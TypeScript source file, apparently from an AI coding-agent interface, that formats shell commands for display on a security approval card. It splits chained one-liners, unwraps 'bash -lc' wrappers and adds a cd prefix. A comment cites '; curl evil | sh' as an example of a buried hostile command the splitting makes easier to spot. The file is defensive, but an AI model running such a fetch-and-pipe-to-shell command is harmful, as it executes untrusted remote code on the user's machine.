// splitBashChains inserts a newline after each top-level `;`, `&&` and `||` so a
// chained one-liner reads as separate steps. It is deliberately optimistic: it
// only tracks quotes and backslash escapes, not the full shell grammar, and a
// command that already contains newlines is left exactly as written.
//
// It is DISPLAY-ONLY and insert-only: it never removes, reorders, or rewrites a
// character, so every byte of the original command is still shown in the same
// order (just with extra line breaks). That property is what makes it safe to use
// on the security approval card - the text a user approves is byte-for-byte the
// command that runs; splitting merely makes a buried `; curl evil | sh` easier to
// spot, never harder.
export function splitBashChains(cmd: string): string {
  if (cmd.includes('\n')) return cmd
  let out = ''
  let inSingle = false
  let inDouble = false
  let escaped = false
  for (let i = 0; i < cmd.length; i++) {
    const ch = cmd[i]
    out += ch
    if (escaped) {
      escaped = false
      continue
    }
    if (ch === '\\') {
      escaped = true
      continue
    }
    if (ch === "'" && !inDouble) {
      inSingle = !inSingle
      continue
    }
    if (ch === '"' && !inSingle) {
      inDouble = !inDouble
      continue
    }
    if (inSingle || inDouble) continue
    // `;` splits (but not `;;`, a case terminator); `&&`/`||` split after the
    // second character. A single `|` (pipe) or `&` (background/redirect) does
    // not.
    const isChain = (ch === ';' && cmd[i + 1] !== ';') || ((ch === '&' || ch === '|') && cmd[i + 1] === ch)
    if (!isChain) continue
    if (ch !== ';') out += cmd[++i]
    while (cmd[i + 1] === ' ') i++
    // Keep the conventional error-suppression suffixes attached to the command
    // they qualify. Splitting `command -v bun || true` (or `... || :`) leaves a
    // visually orphaned no-op on its own line and makes the script harder, not
    // easier, to scan. Other control chains still split normally.
    const rest = cmd.slice(i + 1).trim()
    const trivialFallback = ch === '|' && /^(?:true|:)\s*$/.test(rest)
    if (i + 1 < cmd.length) out += trivialFallback ? ' ' : '\n'
  }
  return out
}

// Codex reports shell commands as the argv-style launcher it executed, commonly
// `/usr/bin/bash -lc '<script>'`. The wrapper is implementation detail, so show
// the script itself while retaining the untouched item behind the tool card's
// Raw toggle. App-server also reports the equivalent `-c` form and, depending
// on platform/launch path, spells the executable as bash, /bin/bash, or
// /usr/bin/bash. Unquoted remainders are accepted because this is a display
// formatter for the provider's command string, not an argv parser.
function parseOneShellWord(source: string): string | null {
  let out = ''
  let quote: "'" | '"' | null = null
  let escaped = false
  let started = false
  for (let i = 0; i < source.length; i++) {
    const ch = source[i]
    if (escaped) {
      out += ch
      escaped = false
      started = true
      continue
    }
    if (quote === "'") {
      if (ch === "'") quote = null
      else out += ch
      started = true
      continue
    }
    if (quote === '"') {
      if (ch === '"') quote = null
      else if (ch === '\\' && /[\\"$`\n]/.test(source[i + 1] ?? '')) escaped = true
      else out += ch
      started = true
      continue
    }
    if (ch === "'" || ch === '"') {
      quote = ch
      started = true
    } else if (ch === '\\') {
      escaped = true
      started = true
    } else if (/\s/.test(ch)) {
      if (started && source.slice(i).trim()) return null
    } else {
      out += ch
      started = true
    }
  }
  return quote || escaped || !started ? null : out
}

function unwrapOneBashCommand(command: string): string {
  const match = command.match(/^(?:\/usr\/bin\/|\/bin\/)?bash\s+-(?:l)?c\s+([\s\S]+)$/)
  if (!match) return command
  const arg = match[1].trim()
  if (!arg) return command
  return parseOneShellWord(arg) ?? arg
}

export function unwrapBashLoginCommand(command: string): string {
  let current = command
  for (let depth = 0; depth < 3; depth++) {
    const next = unwrapOneBashCommand(current)
    if (next === current) break
    current = next
  }
  return current
}

function quoteShellPath(path: string): string {
  return /^[A-Za-z0-9_./-]+$/.test(path) ? path : `'${path.replace(/'/g, `'"'"'`)}'`
}

export function formatBashForDisplay(command: string, cwd?: string): string {
  const script = splitBashChains(unwrapBashLoginCommand(command))
  if (!cwd || cwd === '.' || /^\s*cd(?:\s|$)/.test(script)) return script
  return `cd ${quoteShellPath(cwd)}\n${script}`
}
